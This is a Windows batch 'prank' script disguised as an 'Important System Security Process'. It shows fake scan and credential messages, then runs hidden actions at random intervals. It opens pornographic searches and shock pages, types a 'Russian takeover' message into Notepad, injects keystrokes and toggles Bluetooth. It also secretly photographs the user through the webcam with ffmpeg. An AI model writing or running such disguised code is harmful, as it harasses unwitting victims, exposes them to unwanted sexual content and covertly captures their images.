@echo off
title Important System Security Process

:: Set the full path to the directory this script is running from
set "PRANKDIR=%~dp0"

:: Load configuration
if exist "%PRANKDIR%config.bat" (
    call "%PRANKDIR%config.bat"
) else (
    rem Default values if config.bat doesn't exist
    set MIN_DELAY=300
    set MAX_DELAY=1200
)

echo.
echo  Initializing system integrity scan...
timeout /t 3 /nobreak > nul
echo  Verifying user credentials...
timeout /t 2 /nobreak > nul
echo  Scan complete. Monitoring for anomalies...
timeout /t 2 /nobreak > nul
cls

:prankLoop
rem Generate a random number between 0 and 15 (16 actions)
set /a "action=%RANDOM% * 16 / 32768"

rem Wait for a random time between MIN_DELAY and MAX_DELAY seconds
set /a "delay=%RANDOM% * (%MAX_DELAY% - %MIN_DELAY% + 1) / 32768 + %MIN_DELAY%"
timeout /t %delay% /nobreak > nul

if %action%==0 goto openApp
if %action%==1 goto fakeMessage
if %action%==2 goto openBrowser
if %action%==3 goto systemBeep
if %action%==4 goto whyAmIGay
if %action%==5 goto gayPornExtreme
if %action%==6 goto ghostFace
if %action%==7 goto rickRoll
if %action%==8 goto randomRussian
if %action%==9 goto bomb
if %action%==10 goto randomKeystroke
if %action%==11 goto randomPhrase
if %action%==12 goto takePicture
if %action%==13 goto toggleBluetooth
if %action%==14 goto openCameraApp
if %action%==15 goto closeCameraApp

:openApp
start calc.exe
goto prankLoop

:fakeMessage
msg * "Error: Keyboard not detected. Press any key to continue."
goto prankLoop

:openBrowser
start "" "https://www.google.com/search?q=gay+porn+xxx"
goto prankLoop

:systemBeep
echo ^G
goto prankLoop

:whyAmIGay
start "" "https://youtu.be/Pknipcp78No?si=ATqy0NJbJzfeq8xm"
goto prankLoop

:gayPornExtreme
start "" "https://www.google.com/search?q=gay+porn+extreme"
goto prankLoop

:ghostFace
start "" "https://thumbs.dreamstime.com/b/scary-ghost-face-halloween-theme-scary-ghost-face-halloween-themes-197450460.jpg?w=992"
goto prankLoop

:rickRoll
start "" "https://www.youtube.com/watch?v=xvFZjo5PgG0&list=RDxvFZjo5PgG0&start_radio=1"
goto prankLoop

:randomRussian
start notepad.exe
timeout /t 1 /nobreak > nul
wscript.exe "%PRANKDIR%keypress.vbs" "your pc is about to be taken over by the russian empire"
wscript.exe "%PRANKDIR%keypress.vbs" "{ENTER}"
wscript.exe "%PRANKDIR%keypress.vbs" "Ваш компьютер вот-вот будет захвачен Российской империей"
wscript.exe "%PRANKDIR%keypress.vbs" "{ENTER}"
wscript.exe "%PRANKDIR%keypress.vbs" "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
goto prankLoop

:bomb
start "" "https://www.youtube.com/watch?v=sVuvtfY8RiE"
goto prankLoop

:randomKeystroke
wscript.exe "%PRANKDIR%RandomKeystroke.vbs"
goto prankLoop

:randomPhrase
wscript.exe "%PRANKDIR%RandomPhrases.vbs"
goto prankLoop

:takePicture
if not exist "%PRANKDIR%ffmpeg.exe" (
    echo ffmpeg.exe not found in prank folder, skipping takePicture prank.
    goto prankLoop
)
"%PRANKDIR%ffmpeg.exe" -f dshow -i video="Integrated Camera" -frames:v 1 "%PRANKDIR%shot_%RANDOM%.jpg" -y
goto prankLoop

:toggleBluetooth
powershell -Command "Get-PnpDevice -FriendlyName '*Bluetooth*' | Disable-PnpDevice -Confirm:\$false"
timeout /t 3 /nobreak > nul
powershell -Command "Get-PnpDevice -FriendlyName '*Bluetooth*' | Enable-PnpDevice -Confirm:\$false"
goto prankLoop

:openCameraApp
start microsoft.windows.camera:
goto prankLoop

:closeCameraApp
:: Close the camera app by killing its process
taskkill /f /im WindowsCamera.exe >nul 2>&1
goto prankLoop
